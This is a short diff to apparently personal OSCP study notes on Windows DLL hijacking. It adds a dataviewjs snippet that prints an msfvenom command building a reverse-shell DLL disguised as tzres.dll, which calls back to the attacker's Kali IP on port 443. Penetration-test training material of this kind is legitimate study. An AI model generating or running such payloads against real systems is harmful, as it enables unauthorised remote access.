@@ -36,3 +36,11 @@ C:\Windows\System32\wlbsctrl.dll (IKEEXT service) C:\Windows\System32\wbem\wbemc
 `C:\Windows\System32\wbem\tzres.dll (systeminfo, NetworkService)`
 ```
 
+Windows x64 TCP Reverse shell EXE | PORT 443| tzres.dll
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=443 -f dll > tzres.dll`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
